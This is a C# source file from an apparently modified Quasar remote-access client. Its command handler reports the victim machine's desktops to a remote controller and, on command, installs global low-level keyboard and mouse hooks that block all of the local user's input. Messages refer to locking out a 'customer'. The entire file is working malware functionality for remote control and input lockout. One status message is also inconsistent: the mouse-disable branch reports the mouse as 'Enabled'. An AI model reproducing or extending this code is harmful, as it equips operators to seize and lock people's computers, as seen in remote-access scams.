using Quasar.Client.Utilities;
using Quasar.Common.Enums;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.ServiceModel.Channels;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Quasar.Client.Messages
{
    public class CustomCommandHandler : IMessageProcessor
    {
        const uint TH32CS_SNAPTHREAD = 0x00000004;
        const uint WM_NULL = 0x0000;


        private IntPtr _keyboardHookID = IntPtr.Zero;
        private IntPtr _mouseHookID = IntPtr.Zero;

        private Form _mainForm;

        public delegate IntPtr keyboardHookProc(int nCode, IntPtr wParam, IntPtr lParam);
        public delegate IntPtr mouseHookProc(int nCode, IntPtr wParam, IntPtr lParam);

        const int WH_KEYBOARD_LL = 13;
        const int WM_KEYDOWN = 0x100;
        const int WM_KEYUP = 0x101;
        const int WM_SYSKEYDOWN = 0x104;
        const int WM_SYSKEYUP = 0x105; 
        const int WH_MOUSE_LL = 14;
        const int WM_MOUSEMOVE = 0x0200;

        [DllImport("user32.dll")]
        static extern IntPtr SetWindowsHookEx(int idHook, keyboardHookProc callback, IntPtr hInstance, uint threadId);

        [DllImport("user32.dll")]
        static extern bool UnhookWindowsHookEx(IntPtr hInstance);

        [DllImport("user32.dll")]
        static extern IntPtr CallNextHookEx(IntPtr idHook, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true)]
        static extern bool GetUserObjectInformation(IntPtr hObj, int nIndex, StringBuilder pvInfo, int nLength, out int lpnLengthNeeded);
        [StructLayout(LayoutKind.Sequential)]
        struct THREADENTRY32
        {
            public uint dwSize;
            public uint cntUsage;
            public uint th32ThreadID;
            public uint th32OwnerProcessID;
            public int tpBasePri;
            public int tpDeltaPri;
            public uint dwFlags;
        }
        const int UOI_NAME = 2;

        public CustomCommandHandler(Form mainForm)
        {
            _mainForm = mainForm; // Store reference to the main form
        }

        static string GetDesktopName(IntPtr hDesktop)
        {
            int lengthNeeded;
            // First call to get length
            GetUserObjectInformation(hDesktop, UOI_NAME, null, 0, out lengthNeeded);

            if (lengthNeeded == 0)
                return null;

            StringBuilder sb = new StringBuilder(lengthNeeded);
            if (GetUserObjectInformation(hDesktop, UOI_NAME, sb, sb.Capacity, out _))
            {
                return sb.ToString();
            }

            return null;
        }

        static int currentDesktopIndex = 0;

        public bool CanExecute(IMessage message) => message is DoCustomCommand;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoCustomCommand msg:
                    Execute(sender, msg);
                    break;
                default:
                    break;
            }
        }

        private void Execute(ISender client, DoCustomCommand message)
        {
            if (message.Type == CustomCommandType.GET_ACTIVE_DESKTOP)
            {
                IntPtr hInputDesktop = NativeMethods.OpenInputDesktop(0, false, 268435456U);
                string strDesktopName = GetDesktopName(hInputDesktop);
                client.Send(new DesktopsInformationResponse { ActiveDesktop = strDesktopName, Desktops = "NULL" });
            }
            else if (message.Type == CustomCommandType.GET_DESKTOPS)
            {
                IntPtr hInputDesktop = NativeMethods.OpenInputDesktop(0, false, 268435456U);
                string activeDesktopName = GetDesktopName(hInputDesktop);

                List<string> desktopNames = new List<string>();
                NativeMethods.EnumDesktops(NativeMethods.GetProcessWindowStation(), delegate (string desktop, IntPtr lParam)
                {
                    desktopNames.Add(desktop);
                    return true;
                }, IntPtr.Zero);

                string joinedStr = string.Join("|", desktopNames.ToArray());
                client.Send(new DesktopsInformationResponse { Desktops = joinedStr, ActiveDesktop = activeDesktopName });
            }
            else if (message.Type == CustomCommandType.DISABLE_CST_MOUSE)
            {
                _mainForm.Invoke(new Action(() =>
                {
                    try
                    {
                        IntPtr hInstance = NativeMethods.LoadLibrary("user32.dll");
                        _mouseHookID = SetWindowsHookEx(WH_MOUSE_LL, MouseHookCallback, hInstance, 0);
                        if (_mouseHookID != IntPtr.Zero)
                        {
                            client.Send(new NotifyMessageToServer { Message = "Customer Mouse is Enabled!" });
                        }
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show("Exception From Mouse Disable: " + ex.Message);
                    }
                }));
            }
            else if (message.Type == CustomCommandType.ENABLE_CST_MOUSE)
            {
                _mainForm.Invoke(new Action(() =>
                {
                    if (_mouseHookID != IntPtr.Zero)
                    {
                        UnhookWindowsHookEx(_mouseHookID);
                        _mouseHookID = IntPtr.Zero;
                        client.Send(new NotifyMessageToServer { Message = "Customer Mouse is enabled!" });
                    }
                }));
            }
            else if (message.Type == CustomCommandType.DISABLE_CST_KEYBOARD)
            {
                _mainForm.Invoke(new Action(() =>
                {
                    try
                    {
                        IntPtr hInstance = NativeMethods.LoadLibrary("user32.dll");
                        _keyboardHookID = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookCallback, hInstance, 0);
                        if (_keyboardHookID != IntPtr.Zero)
                        {
                            client.Send(new NotifyMessageToServer { Message = "Customer Keyboard is disabled!" });
                        }
                    }
                    catch (Exception ex)
                    {
                        client.Send(new NotifyMessageToServer { Message = "Exception From Keyboard Diable: " + ex.Message });

                    }
                }));
            }
            else if (message.Type == CustomCommandType.ENABLE_CST_KEYBOARD)
            {
                _mainForm.Invoke(new Action(() =>
                {
                    if (_keyboardHookID != IntPtr.Zero)
                    {
                        UnhookWindowsHookEx(_keyboardHookID);
                        _keyboardHookID = IntPtr.Zero;
                        client.Send(new NotifyMessageToServer { Message = "Customer Keyboard is Enabled!" });
                    }
                }));
            }
        }   
        public IntPtr KeyboardHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0) return (IntPtr)1;  
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }
        public IntPtr MouseHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0) return (IntPtr)1;
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }
    }
}
